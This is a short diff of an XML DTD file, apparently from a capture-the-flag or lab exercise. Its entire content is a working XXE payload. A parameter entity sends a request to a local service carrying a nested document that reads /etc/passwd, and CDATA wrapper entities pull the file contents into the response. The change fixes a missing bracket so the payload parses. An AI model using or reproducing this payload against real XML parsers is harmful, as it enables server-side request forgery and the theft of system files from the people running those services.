@@ -1,4 +1,4 @@
-<!ENTITY % web SYSTEM 'http://localhost:1234/?incantation=<%3fxml+version%3d"1.0"+encoding%3d"ISO-8859-1"%3f><!DOCTYPE+spell+[<!ELEMENT+spell+ANY><!ENTITY+xxe+SYSTEM+"file%3a///etc/passwd">]><spell><name></name><rules>%26xxe%3b</rules></spell>'
+<!ENTITY % web SYSTEM 'http://localhost:1234/?incantation=<%3fxml+version%3d"1.0"+encoding%3d"ISO-8859-1"%3f><!DOCTYPE+spell+[<!ELEMENT+spell+ANY><!ENTITY+xxe+SYSTEM+"file%3a///etc/passwd">]><spell><name></name><rules>%26xxe%3b</rules></spell>'>
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY Contents '%start;%web;%end;'>">
